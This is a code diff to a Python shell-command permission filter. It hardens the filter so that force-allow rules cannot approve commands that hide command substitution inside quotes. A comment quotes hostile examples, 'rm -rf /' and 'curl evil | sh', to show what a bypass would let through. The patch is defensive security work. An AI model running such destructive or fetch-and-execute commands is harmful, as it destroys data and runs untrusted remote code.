@@ -164,6 +164,12 @@ def _unquoted(command: str) -> str:
     return re.sub(r"'[^']*'|\"[^\"]*\"", '""', command)
 
 
+# Substitution forms that remain executable inside double quotes (backticks
+# survive even single quotes): `$(cmd)`, `${var}`, `cmd`. Checked against the
+# RAW command — quote-stripped text must never vouch for these.
+_SUBSTITUTION_RE = re.compile(r"`|\$\(|\$\{")
+
+
 def _static_block(command: str) -> Optional[str]:
     bare = _unquoted(command)
     for rx in _STATIC_BLOCK_RES:
@@ -194,7 +200,11 @@ def _overrides(cfg, command):
     # satisfiable by appending `&& rm -rf /` or ` ; curl evil | sh`. Operator
     # commands fall through to the normal layers — this only ever adds
     # scrutiny, never removes it.
-    if not re.search(r"[|;&`$><\n]", _unquoted(command)):
+    # Command substitution is the exception to quote-stripping: `$()`,
+    # `${...}`, and backticks stay executable inside double quotes, so
+    # _SUBSTITUTION_RE runs on the raw command before force_allow matching.
+    if (not re.search(r"[|;&`$><\n]", _unquoted(command))
+            and not _SUBSTITUTION_RE.search(command)):
         for rx in _compile_res(cfg["force_allow_patterns"]):
             if rx.search(command):
                 return "allow"
